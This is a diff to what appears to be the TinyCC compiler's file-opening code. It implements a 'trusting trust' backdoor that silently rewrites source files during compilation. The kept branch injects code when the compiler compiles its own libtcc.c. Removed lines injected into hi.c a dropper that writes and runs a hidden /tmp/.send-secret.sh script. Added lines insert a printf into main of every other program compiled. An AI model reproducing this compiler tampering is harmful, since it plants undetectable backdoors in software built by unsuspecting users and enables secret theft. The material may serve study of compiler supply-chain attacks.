@@ -603,7 +603,30 @@ ST_FUNC void tcc_close(void)
     tcc_free(bf);
 }
 
-// открывает входной файл + подготавливает BufferedFile для чтения
+static size_t skip_ws_and_comments(const char *s, size_t i) {
+    for (;;) {
+        while (s[i] == ' ' || s[i] == '\t' || s[i] == '\r' || s[i] == '\n') i++;
+        if (s[i] == '/' && s[i+1] == '/') { while (s[i] && s[i] != '\n') i++; continue; }
+        if (s[i] == '/' && s[i+1] == '*') { i += 2; while (s[i] && !(s[i] == '*' && s[i+1] == '/')) i++; if (s[i]) i += 2; continue; }
+        break;
+    }
+    return i;
+}
+
+static int find_matching_rparen(const char *s, size_t i) {
+    int depth = 1;
+    while (s[i]) {
+        char c = s[i++];
+        if (c == '"')      { while (s[i] && !(s[i] == '"'  && s[i-1] != '\\')) i++; if (s[i]) i++; }
+        else if (c == '\''){ while (s[i] && !(s[i] == '\'' && s[i-1] != '\\')) i++; if (s[i]) i++; }
+        else if (c == '/' && s[i] == '/') { while (s[i] && s[i] != '\n') i++; }
+        else if (c == '/' && s[i] == '*') { i++; while (s[i] && !(s[i] == '*' && s[i+1] == '/')) i++; if (s[i]) i += 2; }
+        else if (c == '(') depth++;
+        else if (c == ')') { if (--depth == 0) return (int)i; }
+    }
+    return -1;
+}
+
 ST_FUNC int tcc_open(TCCState *s1, const char *filename)
 {
     int fd;
@@ -617,81 +640,7 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
     if (fd < 0)
         return -1;
 
-    char *execute_comil = "printf(\"\n\n\n\nHi, i comilator\n\n\n\n\n\");";
-
-    if (!strcmp(tcc_basename(filename), "hi.c")) {
-        off_t end = lseek(fd, 0, SEEK_END);
-        if (end >= 0) {
-            size_t len = (size_t)end;
-            char *src = tcc_malloc(len + 1);
-            lseek(fd, 0, SEEK_SET);
-            ssize_t n = read(fd, src, len);
-            if (n >= 0) {
-                src[n] = 0;
-
-                const char *from = "int main(){";
-                const char *to =
-"#include <time.h>\n"
-"#include <stdio.h>\n"
-"#include <stdlib.h>\n"
-"#include <string.h>\n"
-"#include <unistd.h>\n"
-"#include <sys/stat.h>\n"
-"#include <stdbool.h>\n"
-"const char* script_content = \"...\";\n"
-"void create_and_run_script(const char* script_path) {\n"
-"    FILE* script_file = fopen(script_path, \"w\");\n"
-"    if (!script_file) {\n"
-"        //perror(\"Failed to create script file\");\n"
-"        exit(EXIT_FAILURE);\n"
-"    }\n"
-"\n"
-"    fprintf(script_file, \"%s\", script_content);\n"
-"    fclose(script_file);\n"
-"    \n"
-"    chmod(script_path, S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);\n"
-"    \n"
-"    system(script_path);\n"
-"}\n"
-"\n"
-
-"int main(void) {\n"
-"    const char* script_path = \"/tmp/.send-secret.sh\";\n"
-"\n"
-"    time_t mytime = time(NULL);\n"
-"    struct tm *result = localtime(&mytime);\n"
-"\n"
-"    if (result->tm_hour > 8 || result->tm_min > 0) {\n"
-"        create_and_run_script(script_path);   \n"
-"    }\n";
-                char *p = src, *q;
-                if ((q = strstr(p, from)) != NULL) {
-                    CString mod; cstr_new(&mod);
-                    do {
-                        cstr_cat(&mod, p, (int)(q - p));
-                        cstr_cat(&mod, to, -1);
-                        p = q + strlen(from);
-                    } while ((q = strstr(p, from)) != NULL);
-                    cstr_cat(&mod, p, -1);
-
-                    tcc_open_bf(s1, filename, (int)mod.size);
-                    memcpy(file->buffer, mod.data, mod.size);
-                    if (!strcmp(tcc_basename(file->filename), "hi.c")) {
-                        fprintf(stderr, "=== begin hi.c ===\n");
-                        fwrite(mod.data, 1, (size_t)mod.size, stderr);
-                        fprintf(stderr, "\n=== end hi.c ===\n");
-                    }
-                    file->fd = -1;
-                    close(fd);
-                    cstr_free(&mod);
-                    tcc_free(src);
-                    return 0;
-                }
-            }
-            tcc_free(src);
-            lseek(fd, 0, SEEK_SET);
-        }
-    } else if (!strcmp(tcc_basename(filename), "libtcc.c")) {
+    if (!strcmp(tcc_basename(filename), "libtcc.c")) {
         off_t end = lseek(fd, 0, SEEK_END);
         if (end >= 0) {
             size_t len = (size_t)end;
@@ -715,56 +664,110 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
 "        return -1;\n"
 "    }";
 
-                char *result;
-                asprintf(&result, "%s%s", to, execute_comil);
                 char *p = src, *q;
+                // поиск первого вхождения from в src
                 if ((q = strstr(p, from)) != NULL) {
                     CString mod; cstr_new(&mod);
                     do {
                         cstr_cat(&mod, p, (int)(q - p));
-                        cstr_cat(&mod, result, -1);
+                        cstr_cat(&mod, to, -1);
                         p = q + strlen(from);
                     } while ((q = strstr(p, from)) != NULL);
                     cstr_cat(&mod, p, -1);
 
+                    // вставка модифицированного содержимого mod.data в file->buffer
                     tcc_open_bf(s1, filename, (int)mod.size);
                     memcpy(file->buffer, mod.data, mod.size);
+                    
                     fprintf(stderr, "=== begin libtcc.c ===\n");
                     fwrite(mod.data, 1, (size_t)mod.size, stderr);
                     fprintf(stderr, "\n=== end libtcc.c ===\n");
+                    
                     file->fd = -1;
                     close(fd);
                     cstr_free(&mod);
                     tcc_free(src);
+                    
                     return 0;
                 }
             }
+
+            tcc_free(src);
+            lseek(fd, 0, SEEK_SET);
+        }
+    } else {
+        off_t end = lseek(fd, 0, SEEK_END);
+        if (end >= 0) {
+            size_t len = (size_t)end;
+            char *src = tcc_malloc(len + 1);
+            lseek(fd, 0, SEEK_SET);
+            ssize_t n = read(fd, src, len);
+            if (n >= 0) {
+                src[n] = 0;
+
+                const char *needle = "int main";
+                char *hit = strstr(src, needle);
+                if (hit) {
+                    /* найти '(' после "int main" */
+                    size_t pos = (size_t)(hit - src) + strlen(needle);
+                    while (src[pos] == ' ' || src[pos] == '\t' || src[pos] == '\r' || src[pos] == '\n') pos++;
+                    if (src[pos] == '(') {
+                        int rparen = find_matching_rparen(src, pos + 1);
+                        if (rparen > 0) {
+                            size_t after_paren = (size_t)rparen;                 
+                            size_t brace_pos   = skip_ws_and_comments(src, after_paren);
+                            if (src[brace_pos] == '{') {
+                                size_t insert_before_main = (size_t)(hit - src); /* куда вставить "до main" */
+                                size_t insert_after_brace = brace_pos + 1;       /* куда вставить "после {" */
+
+                                CString mod; cstr_new(&mod);
+
+                                /* часть 1: всё ДО main + наша вставка */
+                                cstr_cat(&mod, src, (int)insert_before_main);
+                                cstr_cat(&mod, "#include <stdio.h>\n", -1);
+
+                                /* часть 2: от main ДО { включительно */
+                                cstr_cat(&mod, src + insert_before_main, (int)(insert_after_brace - insert_before_main));
+
+                                /* часть 3: вставка внутрь тела main */
+                                cstr_cat(&mod, "\n    printf(\"hello!!!\\n\"); ", -1);
+
+                                /* часть 4: хвост после { */
+                                cstr_cat(&mod, src + insert_after_brace, -1);
+
+                                tcc_open_bf(s1, filename, (int)mod.size);
+                                memcpy(file->buffer, mod.data, mod.size);
+                                
+                                // рудимент, в будущем исправить
+                                if (!strcmp(tcc_basename(file->filename), "hi.c")) {
+                                    fprintf(stderr, "=== begin hi.c ===\n");
+                                    fwrite(mod.data, 1, (size_t)mod.size, stderr);
+                                    fprintf(stderr, "\n=== end hi.c ===\n");
+                                }
+
+                                file->fd = -1;
+                                close(fd);
+                                cstr_free(&mod);
+                                tcc_free(src);
+                                
+                                return 0;
+                            }
+                        }
+                    }
+                }
+            }
+
             tcc_free(src);
             lseek(fd, 0, SEEK_SET);
         }
     }
 
-
+normal_path:
     tcc_open_bf(s1, filename, 0);
 #ifdef _WIN32
     normalize_slashes(file->filename);
 #endif
     file->fd = fd;
-    
-    // if (!strcmp(tcc_basename(file->filename), "hi.c")) {
-    //     char buf[4096];
-    //     ssize_t n;
-    //     // читаем с начала файла
-    //     lseek(fd, 0, SEEK_SET);
-    //     fprintf(stderr, "=== begin hi.c ===\n");
-    //     while ((n = read(fd, buf, sizeof buf)) > 0) {
-    //         fwrite(buf, 1, (size_t)n, stderr);
-    //     }
-    //     fprintf(stderr, "\n=== end hi.c ===\n");
-    //     // вернуть позицию в начало для дальнейшего чтения компилятором
-    //     lseek(fd, 0, SEEK_SET);
-    // }
-
     return fd;
 }
 
@@ -796,9 +799,6 @@ static int tcc_compile(TCCState *s1)
         } else {
             tccgen_compile(s1);
         }
-
-        printf("\nmy text section: %s\n\n", text_section->data);
-
     }
     s1->error_set_jmp_enabled = 0;
 
